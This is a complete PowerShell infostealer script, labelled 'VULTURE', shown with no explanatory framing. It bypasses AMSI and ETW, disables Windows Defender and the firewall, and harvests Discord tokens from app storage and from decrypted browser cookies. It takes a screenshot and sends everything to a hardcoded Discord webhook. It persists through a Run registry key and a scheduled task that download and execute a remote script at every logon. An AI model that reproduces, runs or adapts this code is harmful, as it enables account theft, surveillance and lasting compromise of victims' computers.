# === CONFIG ===
$hook = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"

# === AMSI/ETW BYPASS ===
try { 
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($a) { $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
} catch {}
try {
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($etw) { $etw.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false) }
} catch {}

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === LOAD SQLITE ASSEMBLY ===
Add-Type -AssemblyName System.Data.SQLite

# === STEAL DISCORD TOKENS FROM ALL SOURCES ===
$tokens = @()

# 1. Discord App LevelDB
"$env:APPDATA\Discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb" | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem "$_\*.log", "$_\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $tokens += $_.Value
                    }
                }
            } catch {}
        }
    }
}

# 2. Browser Cookies (Chrome/Edge/Brave/OperaGX)
$browsers = @(
    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" },
    @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" },
    @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies" },
    @{ Name = "OperaGX"; Path = "$env:APPDATA\Opera Software\Opera GX Stable\Network\Cookies" }
)

foreach ($browser in $browsers) {
    if (Test-Path $browser.Path) {
        $tempDb = "$env:TEMP\cookies_$([Guid]::NewGuid().ToString()).db"
        try {
            Copy-Item $browser.Path $tempDb -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=$tempDb;Version=3;"
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $encryptedValue = $reader["encrypted_value"]
                try {
                    # DPAPI decryption (works for most cookies)
                    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                    $value = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    if ($value -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
                        $tokens += $value
                    }
                } catch {}
            }
            $conn.Close()
        } catch {}
        finally {
            if (Test-Path $tempDb) { Remove-Item $tempDb -Force }
        }
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
$report = "**[VULTURE]**`nPC: $env:COMPUTERNAME`nTokens: $($tokens.Count)`n`n" + ($tokens -join "`n")
$boundary = [Guid]::NewGuid().ToString()
$body = "--$boundary`nContent-Disposition: form-data; name=`"content`"`n`n$report`n--$boundary`nContent-Disposition: form-data; name=`"file`"; filename=`"s.png`"`nContent-Type: image/png`n`n"
$footer = "`n--$boundary--`n"

$webRequest = [Net.WebRequest]::Create($hook)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $body.Length + $bytes.Length + $footer.Length

$reqStream = $webRequest.GetRequestStream()
$reqStream.Write([Text.Encoding]::UTF8.GetBytes($body), 0, $body.Length)
$reqStream.Write($bytes, 0, $bytes.Length)
$reqStream.Write([Text.Encoding]::UTF8.GetBytes($footer), 0, $footer.Length)
$reqStream.Close()
$webRequest.GetResponse()

# === PERSISTENCE ===
$cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsManager" -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn "WindowsManager" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
